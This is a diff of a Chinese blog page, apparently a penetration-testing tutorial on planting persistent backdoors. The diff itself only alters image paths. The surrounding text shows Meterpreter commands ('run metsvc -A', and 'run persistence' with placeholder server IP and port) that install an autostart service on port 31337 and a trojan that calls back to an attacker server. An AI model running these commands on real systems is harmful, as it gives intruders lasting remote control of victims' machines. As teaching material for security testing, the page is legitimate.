@@ -119,12 +119,18 @@
 <p>该模块生成一个端口为31337服务，并且上传到Temp临时文件夹下保存，当系统启动时直接开启服务。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028164717074.png" alt="image-20211028164717074"></p>
+<img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028164717074.png" class title="image-20211028164717074">
+
+
+
 <h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><hr>
 <p>该后门 模块 是通过设置定期时间连接服务器端口，系统启动时回连，自动运行。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -A -S -U -i 60 -p 服务器端口 -r 服务器ip地址</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028165356667.png" alt="image-20211028165356667"></p>
+<img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028165356667.png" class title="image-20211028165356667">
+
+
+
 <p>可以看到生成个自动运行的木马到临时文件夹中，随着系统开启而运行</p>
  
       <!-- reward -->
